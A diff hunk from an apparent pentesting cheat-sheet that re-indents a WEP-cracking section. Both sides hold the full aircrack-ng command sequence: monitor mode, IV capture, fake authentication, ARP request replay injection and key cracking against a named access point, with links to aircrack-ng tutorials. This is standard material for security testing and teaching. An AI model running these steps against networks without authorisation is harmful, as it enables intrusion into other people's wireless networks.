@@ -12,22 +12,22 @@
    ## WEP crack
    * [Flowchart : Wep Cracking](http://www.aircrack-ng.org/img/simple-wep-crack.gif)
    * [Crack WEP (with client)](https://www.aircrack-ng.org/doku.php?id=simple_wep_crack) (fake authentication combined with ARP request replay technique)
-    ```bash
-       # List wireless interfaces
-       iwconfig
-       # Start the wireless interface in monitor mode on the specific AP channel
-       airmon-ng start wlan0
-       # Show available AP
-       airodump-ng wlan0mon
-       # Start airodump-ng to capture the IVs
-       airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w output wlan0mon
-       # Use aireplay-ng to do a fake authentication with the access point (To associate with an access point)
-       aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon
-       # Start aireplay-ng in ARP request replay mode to inject packets
-       aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon
-       # Run aircrack-ng to crack key using the IVs collected
-       aircrack-ng -b 00:14:6C:7E:40:80 output*.cap
-     ```
+      ```bash
+         # List wireless interfaces
+         iwconfig
+         # Start the wireless interface in monitor mode on the specific AP channel
+         airmon-ng start wlan0
+         # Show available AP
+         airodump-ng wlan0mon
+         # Start airodump-ng to capture the IVs
+         airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w output wlan0mon
+         # Use aireplay-ng to do a fake authentication with the access point (To associate with an access point)
+         aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon
+         # Start aireplay-ng in ARP request replay mode to inject packets
+         aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon
+         # Run aircrack-ng to crack key using the IVs collected
+         aircrack-ng -b 00:14:6C:7E:40:80 output*.cap
+      ```
    * [Crack WEP (without client)](https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients)
 
   # WAP crack
